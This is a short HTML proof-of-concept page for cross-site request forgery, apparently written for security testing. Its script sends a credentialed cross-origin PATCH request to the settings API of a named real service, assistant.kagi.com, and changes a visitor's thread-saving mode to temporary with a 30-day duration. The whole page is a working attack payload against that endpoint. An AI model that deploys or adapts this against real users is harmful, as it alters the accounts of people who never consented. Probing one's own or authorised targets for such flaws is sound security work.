
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>CSRF Test</title>
</head>
<body>
  <h2>CSRF Security Test</h2>
  <button onclick="testCSRF()">Test Request</button>
  <pre id="result"></pre>

  <script>
    async function testCSRF() {
      const result = document.getElementById("result");

      try {
        const response = await fetch(
          "https://assistant.kagi.com/api/settings",
          {
            method: "PATCH",
            credentials: "include",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify({
              "thread_saving_mode": "temporary",
              "temporary_duration": "30d"
            })
          }
        );

        result.textContent =
          "HTTP Status: " + response.status;
      } catch (error) {
        result.textContent =
          "Request blocked or failed: " + error;
      }
    }
  </script>
</body>
</html>
